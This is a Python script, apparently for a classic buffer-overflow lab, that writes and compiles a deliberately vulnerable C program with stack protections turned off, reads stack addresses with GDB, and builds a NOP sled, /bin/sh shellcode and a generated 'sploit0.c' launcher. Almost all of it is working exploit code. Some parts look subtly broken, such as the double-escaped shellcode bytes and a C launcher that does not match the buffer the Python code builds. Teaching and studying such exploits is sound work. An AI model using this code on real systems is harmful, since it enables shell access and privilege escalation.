import subprocess
import re

# Define the source code of target0.c
source_code = """
#include <stdio.h>
#include <string.h>

void greeting(char* temp1)
{
    char name[400];
    memset(name, 0, 400);
    strcpy(name, temp1);
    printf("Hi %s\\n", name);
}

int main(int argc, char* argv[])
{
    if (argc < 2) {
        printf("Usage: %s <input>\\n", argv[0]);
        return 1;
    }
    greeting(argv[1]);
    printf("Bye %s\\n", argv[1]);
    return 0;
}
"""

# Shellcode to execute
shellcode = (
    b"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\xb0\\xa4\\xb3\\x1f\\xb1\\x1f\\xb2\\x1f"
    b"\\xcd\\x80\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c"
    b"\\xb0\\x0b\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8"
    b"\\x40\\xcd\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh"
)

print("[+] Compiling the target program...")
# Compile the target program
with open("target0.c", "w") as f:
    f.write(source_code)
subprocess.run(["gcc", "-ggdb", "-mpreferred-stack-boundary=2", "-zexecstack", "-fno-stack-protector", "-no-pie", "-fno-pie", "-m32", "-o", "target0", "target0.c"])
print("[+] Target program compiled.")

print("[+] Running GDB to extract stack pointer and base pointer values...")
# Run GDB and extract the stack pointer and base pointer values
gdb_output = subprocess.check_output(["gdb", "-q", "-ex", "break greeting", "-ex", "run $(python3 -c 'print(\"A\"*400)')", "-ex", "print $esp", "-ex", "print $ebp", "-ex", "quit", "./target0"]).decode()
esp_match = re.search(r"\$1 = \(void \*\) (0x[0-9a-f]+)", gdb_output)
ebp_match = re.search(r"\$2 = \(void \*\) (0x[0-9a-f]+)", gdb_output)

if esp_match and ebp_match:
    esp = int(esp_match.group(1), 16)
    ebp = int(ebp_match.group(1), 16)
    offset = ebp - esp
    print(f"[+] Stack pointer (ESP): 0x{esp:x}")
    print(f"[+] Base pointer (EBP): 0x{ebp:x}")
    print(f"[+] Offset: {offset} bytes")
else:
    print("[-] Failed to extract stack pointer and base pointer values.")
    exit(1)

print("[+] Crafting the exploit buffer...")
# Craft the exploit buffer
nop_sled = b"\\x90" * (400 - len(shellcode))
return_address = esp.to_bytes(4, byteorder='little')
exploit_buffer = nop_sled + shellcode + return_address
print("[+] Exploit buffer crafted.")

print("[+] Writing the exploit buffer to sploit0.c...")
# Write the exploit buffer to sploit0.c
with open("sploit0.c", "w") as f:
    f.write(f"""
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target0"

int main(void)
{{
    char *args[3];
    char *env[1];
    char buf[408];

    // Fill the buffer with NOPs
    memset(buf, 0x90, sizeof(buf));

    // Copy the shellcode to the beginning of the buffer
    memcpy(buf, shellcode, strlen(shellcode));

    // Use the address of buffer + an offset to the NOP sled
    *(unsigned int*)(buf + 400) = 0x{esp:x};

    // Null terminate the buffer
    buf[sizeof(buf) - 1] = '\\0';

    args[0] = TARGET;
    args[1] = buf;
    args[2] = NULL;

    env[0] = NULL;

    execve(TARGET, args, env);
    fprintf(stderr, "execve failed.\\n");

    return 0;
}}
""")
print("[+] sploit0.c has been generated.")